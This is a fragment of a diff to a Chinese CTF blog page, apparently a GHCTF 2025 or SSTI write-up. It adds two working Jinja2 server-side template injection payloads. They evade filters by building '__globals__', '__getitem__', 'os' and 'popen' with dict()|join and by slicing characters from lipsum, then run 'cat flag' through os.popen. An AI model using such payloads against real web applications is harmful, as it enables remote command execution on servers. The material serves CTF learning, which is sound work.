+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> pop=dict(pop=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> xiahuaxian=(lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(pop)(<span class="hljs-number">18</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> globals=(xiahuaxian,xiahuaxian,dict(globals=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,xiahuaxian,xiahuaxian)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,xiahuaxian,xiahuaxian)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> space=(lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(pop)(<span class="hljs-number">9</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> os=dict(os=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> popen=dict(popen=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cat=dict(cat=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cmd=(cat,space,dict(flag=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> read=dict(read=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum<span class="hljs-punctuation">|</span>attr(globals)<span class="hljs-punctuation">|</span>attr(getitem)(os)<span class="hljs-punctuation">|</span>attr(popen)(cmd)<span class="hljs-punctuation">|</span>attr(read)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> one=dict(a=a)|<span class="hljs-name">join</span>|count%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> eight=dict(aaaaaaaa=a)|<span class="hljs-name">join</span>|count%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> nine=dict(aaaaaaaaa=a)|<span class="hljs-name">join</span>|count%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> eighteen=(one~eight)|int%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> pop=dict(pop=a)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> globals=(xiahuaxian,xiahuaxian,dict(globals=a)|<span class="hljs-name">join</span>,xiahuaxian,xiahuaxian)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|<span class="hljs-name">join</span>,xiahuaxian,xiahuaxian)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> space=(lipsum|string|list)|attr(pop)(nine)%&#125;</span><span class="language-xml"> </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> os=dict(os=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> popen=dict(popen=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"> </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> cat=dict(cat=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> cmd=(cat,space,dict(flag=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"> </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> read=dict(read=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -463,9 +815,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/13/26SSTI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="SSTI学习总结">
+                      <a href="/2025/07/13/26GHCTF2025/" title="GHCTF2025">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSTI学习总结</span>
+                        <span class="hidden-mobile">GHCTF2025</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
